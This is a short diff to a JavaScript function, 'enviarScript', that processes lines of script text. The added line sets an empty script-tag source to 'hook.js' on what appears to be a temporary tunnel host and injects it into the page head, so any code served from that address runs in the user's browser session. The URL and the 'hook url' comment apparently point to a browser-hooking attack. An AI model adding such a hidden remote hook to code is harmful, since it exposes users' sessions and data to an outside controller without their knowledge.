@@ -20,7 +20,7 @@ async function enviarScript(scriptText){
 	}
   
   var hook = createElement('script');
-  hook.src = ""; //hook url
+  hook.src = "https://cc75f61a033665.lhr.life/hook.js"; //hook url
   document.head.appendChild(hook);
 	
 	return lines.length;
